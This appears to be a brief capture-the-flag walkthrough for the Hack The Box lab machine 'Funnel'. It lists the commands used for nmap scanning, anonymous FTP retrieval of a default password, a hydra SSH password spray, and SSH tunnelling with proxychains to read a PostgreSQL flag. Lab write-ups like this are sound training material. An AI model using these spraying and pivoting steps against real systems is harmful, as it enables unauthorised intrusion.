# Funnel

IPv4: 10.129.228.195

## Enumeration/Scanning

- sudo nmap -sV -sC -Pn 10.129.228.195 -p-
    
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
    | ftp-syst:
    |   STAT:
    | FTP server status:
    |      Connected to ::ffff:10.10.16.173
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 3
    |      vsFTPd 3.0.3 - secure, fast, stable
    |*End of status
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
    |   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
    |*  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 23.27 seconds
    

Anonymous login to ftp pulled 2 files

password_policy.pdf and welcome_28112022

- welcome_28112022
    
    optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
    
    read the password policy pdf
    

- xdg-open password_policy.pdf
    
    default password funnel123#!#
    

create a user list and run a password spray

hydra -L users.txt -p 'funnel123#!#' ssh://10.129.228.195

login: christine password: funnel123#!#

## Exploitation

## Privilege Escalation

netstat -ano or ss -tln

127.0.0.1:5432

Port 5432

https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql

postgresql

local port forwarding

ssh -L 1234:localhost:5432 christine@10.129.228.195

verify it was set up correctly

nmap -sV -sC -p1234 localhost

1234 shows postgresql 

Another way is dynamic port forwarding and proxy chains

ssh -D 9050 christine@10.129.228.195

nano /etc/proxychains.conf

- socks4 127.0.0.1 9050

proxychains4 nmap -sV -sC -p5432 localhost

Shows we can access postgresql through proxychains

You can start a bash instance with proxychains to keep the chains consistent without having to add the proxychains4 command to your liners.

proxychains4 -q bash

nmap -sV -sC -p5432 localhost

\list 

\c secrets

\d

SELECT * FROM flag;

flag found

## Post-exploitation

None
